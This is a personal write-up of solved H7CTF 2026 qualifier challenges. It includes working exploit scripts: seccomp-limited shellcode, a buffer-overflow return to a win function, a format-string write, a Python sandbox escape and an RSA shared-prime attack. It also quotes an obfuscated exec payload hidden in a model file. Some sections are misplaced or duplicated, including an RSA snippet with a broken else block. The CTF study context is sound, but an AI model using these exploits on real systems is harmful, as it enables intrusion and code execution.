# H7CTF 2026
Here is where I am doing my writeups for the challenges I solved during the qualifier. 

### Time Capsule (Misc)
> Description: A Sparrow Freight developer swears the production token never made it into a commit, and the history is spotless. We pulled their repo before anyone could tidy it further. \
> Never committed is not the same as never there. 

The challenge provides the Git folder and the lost-found folder is what stores lost commits. The first file stores the fake production token, while the second stores the real token, with a comment saying "DO NOT COMMIT" for it.
### Out of the Box
> Description: They stood up an expression evaluator, emptied the room it runs in, and put a bouncer on the door to turn away anything dangerous. The flag sits on the same box, just out of the room's reach. \
> Read it anyway. 
### Assembly Line
> Description: The Sparrow Freight sorting line never slows down: a long run of tiny jobs, each on a short clock, far more than any pair of hands can chase. \
> Clear the whole shift and the line signs out the day's code.

The challenge requires us to automate the tasks, so we can write a script that parses the input as such. More are written in the comments.

Solver Script:
```python
from pwn import *
import base64
print("Connecting to the challenge")
conn = remote("pwn.h7tex.com", 40133)
print("Done")
# The challenge requires us to automate tasks, each task only allowing 2 seconds to solve.
# There are also print() statements for debug
def sendresult(data):
    data = f"{data}".encode()
    conn.sendline(data)
    print(data)

while True:
    task_sentence = conn.recvrepeat(timeout=0.25).decode()
    if "H7CTF" in task_sentence: # Flag found
        print("FLAG:", task_sentence)
        break
    print(task_sentence)
    # Check all the tasks to do via some "nc pwn.h7tex.com 40199" runs.
    if "eval" in task_sentence:
        eval_value = task_sentence.split(":")[1].strip()
        result = eval(eval_value)
        sendresult(result)
    elif "sum" in task_sentence:
        sum_value = [int(i) for i in task_sentence.split(":")[1].strip().split(",")]
        result = sum(sum_value, 0)
        sendresult(result)
    elif "reverse" in task_sentence:
        reverse_value = task_sentence.split(":")[1].strip()
        result = reverse_value[::-1]
        sendresult(result)
    elif "b64" in task_sentence:
        b64_value = task_sentence.split(":")[1].strip()
        result = base64.b64decode(b64_value).decode() # This is a byte object already, have to encode for sendresult()
        sendresult(result)     
```
### Safe Space (pwn)
> Description: The vault throws its doors wide and lets you set up shop inside. There is only one move it will not tolerate, and wouldn't you know it, that is exactly the one you had planned. \
> You will have to take what you came for the long way around.

Looking at the "vault" executable using Ida or Ghidra, this challenge is about shellcoding. However, lockdown() has many seccomp-related functions, which, after a lookup on the documentation, are supposed to filter for certain system calls by their codes when the syscall is called. We should look at this line:
```c
seccomp_rule_add(uVar1,0x7fff0000,local_48[local_54],0);
```
After looking at [Seccomp guide](https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html) and [documentation of seccomp_rule_add](https://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html), it appears these are the syscalls we are allowed to use.
Solver Script:
```python
v3 = [0] * 14
# Copied from the Ghidra pseudocode window, Ida lost parts of the code.
# From the documentation at https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
v3[0] = 257 # openat
v3[1] = 2 # open
v3[2] = 0 # read
v3[3] = 1 # write
v3[4] = 3 # close
v3[5] = 8 # lseek
v3[6] = 5 # fstat
v3[7] = 262 # newfstatat
v3[8] = 9 # mmap
v3[9] = 11 # munmap
v3[10] = 12 # brk
v3[11] = 15 # rt_sigreturn
v3[12] = 60 # exit
v3[13] = 231 # exit_group
from pwn import * 
import pwnlib
context.arch = "amd64"
context.os = "linux"
conn = remote("pwn.h7tex.com", 43109)
# checksec information
'''
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
'''
print(conn.recvrepeat(timeout=0.5).decode())
# We can do an open(), read() and close() for our flag file, with the allowed syscalls
# RIP-relative addressing is a standard x86-64 addressing mode where 
# the effective address is calculated relative to the next instruction's RIP.
# Or I could push null-terminated pieces onto the stack and move the stack pointer to rdi
# Have to use lea to move addresses, not values
# Neat trick to be able to use a longer-than-8-byte string, auto null-terminated, and no need to reverse and convert to hex
# First: fd = open("/flag", 0, 0)
shellcode = '''
xor rsi, rsi
lea rdi, [rip+flag]
mov rdx, 0
mov rax, 2
syscall
'''
# Then: read(fd, buffer, 100)
# Can use stack for buffer
shellcode += '''
mov rdi, rax
mov rsi, rsp
mov rdx, 100
mov rax, 0
syscall
'''
# Finally: write(1, buffer, numBytes), where 1 = stdout
shellcode += '''
mov rdi, 1
mov rsi, rsp
mov rdx, rax
mov rax, 1
syscall
flag:
  .string "/flag"
'''
# Turns out the file is at /flag, not /flag.txt or ./flag.txt. I saw it on the challenge objectives.
shellbytes = asm(shellcode=shellcode)
conn.send(shellbytes)
print("Done sending shellcode")
print(conn.recvrepeat(timeout=1).decode())
print("Done")
```
### Gone Not Forgotten (Forensics)
> Description: A phone lands on the evidence bench for a harassment case, and the suspect is adamant they never sent anything ugly. Nova Messenger agrees with them: nothing there. \
> Deleting a thing and being rid of it were never the same move.

There is a .db file and a HTML document. Looking at the database file, it is a SQLite database so we can use an [online SQLite Viewer](https://inloop.github.io/sqlite-viewer/) to look at it. There seems to be a regular conversation so we looked at the HTML document and it reveals much more. We know the key and the way that the data is encoded: hex(xor(body, obfuscation_key)).

Then we found the data after looking at some hidden parts of the .db file using:
```
strings messages.db
```
There is this random hexadecimal-looking string, which may be the data to look for:
```
26073560251303150a564f025a5d521658054357545d064c5f000b
```
Using CyberChef, we can use "From Hex" and "XOR" with the key `n0v4ch4t` in UTF8 format to get the flag from this string.
### Model Package Autopsy
> Description: Meridian's ML team pulled a fine-tuned model off an internal build agent and queued it straight for production. The operator who packaged it left something off the changelog. \
> Consider this the postmortem.

For this one, I have little background knowledge on AI models so I am quite brute forcing it, but from the looks of `pytorch_model.bin` in a text editor, we can see a bunch of ZIP files, which extracted to nothing in CyberChef using `Unzip`. However, there is also a clear line of Python code:
```python
exec(__import__('zlib').decompress(__import__('base64').b64decode('eJw9j01Lw0AQhu/7K17ooS3aUkzQEPEgonirlN5lk52Ywc1OnN31A/G/uyj6MrcZnnneBSZSdmzDZvLoMnsH+0QhoW0xS0wbL9ZhFHnGygmCJMSR57XhaRZNkHiKrN5zt1V6yRST2T/cHq6P+wOusLy/uDnefZ7Xu2Y31GddXfUN1c2uqvqvpXE04LEj20tYrVuDkgXeJBcHeh/YF/iWwiurBJwUh5jAYRCkMiNBZlKbRKHk7cclAuVESq4clT3H3zo/WKWUNeDPzPx/Nd9aclOe')).decode())
```
Therefore, we can copy this string into CyberChef to base64-decode it and save the output into a file. Then, using `zlib-flate`, we can use the command:
```
zlib-flate -uncompress < download.zlib
```
This gets us the flag as the value of "OPERATOR" in the decoded Python code.
### Ghost in the Timeline (Forensics)
> Description: Description
An engineer stands accused of walking off with the product roadmap, and the alibi is tidy: the file predates their access, nothing was staged, nothing deleted, and every timestamp agrees. \
> Timestamps are only as honest as whoever set them.

We are given a disk image, so we can do some basic enumeration with Sleuth Kit using `mmls` (for partitions) and `fsstat` for filesystem info. Then we can look at the files themselves using the command:
```
fls -rp case_disk.img
```
There is a deleted file which is recoverable, so we can use these commands to recover all files, whether or not it is deleted, and take a look at their content:
```
tsk_recover -e case_disk.img case_disk
find ./case_disk -type f | xargs cat
```
From the output, we should focus on q3_designs.zip, so we can unzip the file and look at secret.txt. Inside the lines of asset files, there is the flag which is the recovery token.
### Papers Please (Pwn)
> Description: The Sparrow Freight border checkpoint takes down your name, denies you entry, and tells you to turn back. Somewhere behind the booth is the stamp that waves people straight through, and the guard is not going to reach for it on your account. \
> So reach for it yourself.

Looking at the code with Ida, this is a case of buffer overflow. Further explanation can be seen in the comment of this solver script:
```python
# grant_access() is at 0x401216
# checksec info:
'''
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
'''
# The code is simply as such:
'''
char buf[64]; // [rsp+0h] [rbp-40h] BYREF
puts("=== Sparrow Freight border checkpoint ===");
puts("State your name for the log:");
read(0, buf, 0x100u);
return printf("Access denied, %s. Turn back.\n", buf);
'''
# Classic case of buffer overflow, reading 256 bytes of data into 64 bytes of buffer
from pwn import *
conn = remote("pwn.h7tex.com", 43129)
print(conn.recvrepeat(timeout=0.5).decode())
buffer = 64
address = 0x401216
conn.send(b"A" * (buffer + 8) + p64(address)) # Pack the address into 8-byte
print(conn.recvrepeat(timeout=0.5).decode())
```
### Low and Slow (Forensics)
> Description: Six weeks, not one alert, a clean bill of health on every dashboard that mattered. Then a partner asks why your unreleased designs are making the rounds. \ 
> Something in here has been talking to the outside on a very patient schedule.

The challenge provides us a .pcap file and if we just take a look at the TCP streams, there won't be anything to notice other than the response body being the text "ok". Instead, we take a look at the DNS data by filtering out only DNS packets, and we can see certain domains that are not resolved:
```
00ja3ugvcgpm3doobx.sync.cdn-telemetry-lab.net
01mi4dmy3dg43tozru.sync.cdn-telemetry-lab.net
02gi3geoldgb6q.sync.cdn-telemetry-lab.net
```
These packets can be filtered with `dns and dns.flags.rcode != 0`. The first part of these domains are the parts of the flag in Base32, with the first two digits used to organize data. Therefore, we can get the flag using CyberChef or with a custom script:
```python
import re
import base64
dns_data = '''
00ja3ugvcgpm3doobx.sync.cdn-telemetry-lab.net
01mi4dmy3dg43tozru.sync.cdn-telemetry-lab.net
02gi3geoldgb6q.sync.cdn-telemetry-lab.net
'''
dns_data = [data for data in dns_data.splitlines() if data.strip() != ""]
ciphertext = [re.sub(r"^0\d", "", data.split(".")[0]) for data in dns_data]
ciphertext = "".join(ciphertext).upper() # It is Base32 data, which uses uppercase characters rather than lowercase ones.
ciphertext += "=" * (-len(ciphertext) % 8) # Python requires padding, stricter than CyberChef
decrypted = base64.b32decode(ciphertext)
print("FLAG:", decrypted.encode())
```
### Out of the Box (Misc)
> Description: They stood up an expression evaluator, emptied the room it runs in, and put a bouncer on the door to turn away anything dangerous. The flag sits on the same box, just out of the room's reach.
> Read it anyway.

For this challenge, from reading the `jail.py` file, it is a Python eval() situation, where the program bans certain words in our user input into eval(). In addition, it also denies any builtin modules. But we could always start at an empty object and work our way towards a different class.
```python
def jailed(src: str) -> str:
    src = src.strip()
    if not src:
        return ""
    if len(src) > MAXLEN:
        return "error: too long"
    low = src.lower()
    for b in BANNED:
        if b in low:
            return f"denied: '{b}' is not allowed"
    try:
        return repr(eval(src, {"__builtins__": {}}, {}))
    except Exception as e:
        return f"error: {type(e).__name__}: {e}"
```
One way to do this is with an exploit as such, where we identified ` <class 'os._wrap_close'>` in the subclass list and can check its variables, where the flag is one of the variables in there. Perhaps not the intended way, where we have to read /flag.txt, but it did work.
```python
[x for x in ().__class__.__base__.__subclasses__()][-4].__init__.__globals__
```
### Overexposed (Misc)
> Description: The comms team blacked out the sensitive photo before it went public. Nothing left in the pixels, they swore. \
> For a redaction, it reveals an awful lot.

The challenge provides a `overexposed.png`. Checking its byte values, we can see some data after the "IEND" bytes and notice some ZIP-related data, with bytes like "PK". Therefore:
```bash
binwalk overexposed.png # To identify offset
dd if=overexposed.png of=readme.zip bs=1 skip=3021 # Extract raw bytes of that ZIP-file
```
Then we can unzip only readme.txt successfully with:
```bash
7z x readme.zip
```
The readme.txt file tells us that the Central Directory Header is missing data and we should instead look at the Local File Headers to do the decompression manually:
```bash
zipdetails --scan readme.zip # To identify all local file headers
```
Here, there are two ways to do this: decompress manually using CyberChef (with "Raw Inflate" due to "Deflated" compression method) or forcefully fix the ZIP file with `zip -FF readme.zip --out readmefix.zip`.For the first way, we could look at the bytes with `xxd -a overexposed.png` and identify the labels for the missing files, then copy those bytes (in hexadecimal) with "From Hex" and "Raw Inflate" in CyberChef specifically. **Note that the bytes (and ASCII characters) are sequential, no endianness here.**

After successfully recovering part2.txt and part3.txt, there is hints of part1.txt near the start of overexposed.png:
```bash
# Output of xxd
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0208 0000 00dc 0802 0000 009a aece  ................
00000020: 2400 0000 167a 5458 7470 6172 7431 0000  $....zTXtpart1..
00000030: 789c 3330 4b49 3433 4c02 0007 7901 f51f  x.30KI43L...y...
00000040: 5c9c 2300 000b 7249 4441 5478 9ced dd6b  \.#...rIDATx...k
```
It is likely that the headers may be a little damaged, but the content is still there. Bytes 0x789c signify that there is the zlib header in front, so we could use CyberChef to decompress the bytes that follow, with "From Hex" and "Zlib Inflate" instead to get part1.txt. Combine all three parts and wrap it in "HCTF{}" for the full flag.

References: \
https://en.wikipedia.org/wiki/ZIP_(file_format) \
https://isc.sans.edu/diary/25182
### Kick the CAN (Hardware)
> Description: We spliced into a car's wiring while it was in for service and let the recorder run. Most of the traffic is the usual engine gossip, but two boxes were having a far more private conversation.
> One of them said too much.

This challenge provides a capture.log file, which can be opened with "candump/can-utils, Wireshark (SocketCAN), or python-can". I looked up what CAN is and it is a protocol for microcontrollers and devices to communicate inside a vehicle (https://en.wikipedia.org/wiki/CAN_bus). So we can open this file with Wireshark and looking at the first few packets, we can see the flag in the data section, just fragmented. We can hover over the flag fragment, right-click and do Copy > Copy As UTF-8 Text to make this quicker.

```python
# Perhaps the n's have something resemblences, probably same p or q?

for camera in fleet["devices"]:
    if captured["serial"] == camera["serial"]:
        captured_n = int(camera["n"])
        break
else:

# Is there some sort of same prime factors? Due to the hint of "Shared Blood"
for camera in fleet["devices"]:
    if captured["serial"] == camera["serial"]:
        continue
    test_n = int(camera["n"])
    test_serial = camera["serial"]
    shared = math.gcd(test_n, captured_n)
    print(f"Shared Factor between {captured["serial"]} and {camera["serial"]}: {shared}")
    if shared != 1: # Found one
        p = shared 
        q = captured_n // p 
        phi = (p-1) * (q-1)
        public_key = captured["e"]
        private_key = pow(public_key, -1, phi)
        print("Found private key:", private_key)
        plaintext = pow(int.from_bytes(bytes.fromhex(captured["ciphertext"])), private_key, captured_n)
        plaintext = int.to_bytes(plaintext, plaintext.bit_length()//8+1)
        print("Found plaintext:", plaintext)
# The token is at the end, in clear ASCII: vlt_80eba5313d2b8f2e3ffd329a
# Input at /admin endpoint to get the flag
```
### Manifest Destiny (Pwn)
> Description: Sparrow Freight keeps its cargo manifest under admin clearance, which is not something they planned on giving you. Good thing the terminal loves feedback and takes your every word to heart.
> Some of us are just destined for management.

The explanation in full is included in the comment of the solver script below.

Solver Script:
```python
from pwn import *
import pwnlib
# Looking at the Ida pseudocode of manifest, we can notice:
'''
int feedback()
{
  char s[208]; // [rsp+0h] [rbp-D0h] BYREF
  memset(s, 0, 0xC8u);
  puts("Leave feedback for the terminal operators:");
  read(0, s, 199u);
  printf("You said: ");
  printf(s);
  return puts(byte_40209E);
}
'''
# This is a clear case of user input affecting printf(), which is a format string vulnerability
# Then:
'''
int view_manifest()
{
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  FILE *stream; // [rsp+88h] [rbp-8h]
  if ( !is_admin )
    return puts("[!] admin clearance required.");
  stream = fopen("/flag", "r");
  if ( !stream )
    return puts("[!] flag file missing");
  fgets(s, 128, stream);
  fclose(stream);
  return printf("[manifest] clearance code: %s\n", s);
}
'''
# Okay, it seems that we have to fill in these slots on our own using a format string exploit
# We are also in an endless while-loop, so we first find where these variables are in memory and then writing them
# Okay, we just need to change is_admin to be some non-zero value, stream is for the "/flag" file. 
'''
.bss:000000000040407C is_admin        dd ?                    ; DATA XREF: view_manifest+F↑r
'''
# checksec info (no PIE, so we know what address to put there)
'''
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
'''
conn = remote("pwn.h7tex.com", 41609)
# Initially, look at the stack data per 8-byte
# Also see where our user input starts appearing on the stack
def enumerate():
  conn.sendline(b"1")
  conn.send(("ABCDEFGH" + " ".join([f"%{i}$lx" for i in range(1, 10)])).encode())
  print(conn.recvrepeat(timeout=0.5).decode())
# From this, it is at %6$lx, however it is 6-1 because we added the first 8 bytes of characters
def solve_chall():
  initial_pos = 5
  address = 0x40407c
  non_zero = 50
  # Actual Payload:
  payload = pwnlib.fmtstr.fmtstr_payload(initial_pos, {address: non_zero}, numbwritten=0, write_size='short')
  print("PAYLOAD:", payload)
  print("PAYLOAD (hex):", payload.hex())
  print("len(PAYLOAD):", len(payload))
  conn.sendline(b"1")
  print(conn.recvuntil(b"Leave feedback for the terminal operators:\n").decode())
  conn.send(payload)
  print(conn.recvrepeat(timeout=0.5).decode())
  conn.sendline(b"2")
  flag_get = conn.recvrepeat(1).decode(errors="replace")
  if flag_get: 
    print("Data is not empty")
    print(flag_get)
  else:
    print("Connection closed")
solve_chall()
```
### Onyx Locker (Mobile) (Not Finished)
> Description: Onyx Locker keeps all your secrets on the phone, never in the cloud, exactly as promised. The vault's recovery code sits right there on the device, sealed up tight and yours alone. \
> Yours, and anyone who bothers to look.

This is a good challenge for me to practice Android reverse engineering tools, such as [JADX](https://github.com/skylot/jadx/releases#release-v1.5.6) (I am using the GUI version) and [ADB](https://developer.android.com/studio/releases/platform-tools) to communicate with an [Android emulator](https://developer.android.com/studio#command-tools). An emulator basically mimics another system such as an Android device.

After opening onyx-locker-2.4.0.apk, we can see through the different XML files and especially the Java/Kotlin source code. We do not need to open the `classes.dex` file in an online decompiler seperately. In AndroidManifest.xml, there is this section of code which shows the entry point of the program since there is no main()-like method, but rather it tells which function to run upon booting up the app:
```xml
<activity
    android:name="com.onyx.locker.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```
From VaultCrypto, we have access to the key and iv that is used to encrypt `vault.enc`, but we do not have that file yet. It may require interacting with the server that we start in the challenge page for us to get it, based on the code in MainActivity and Session.
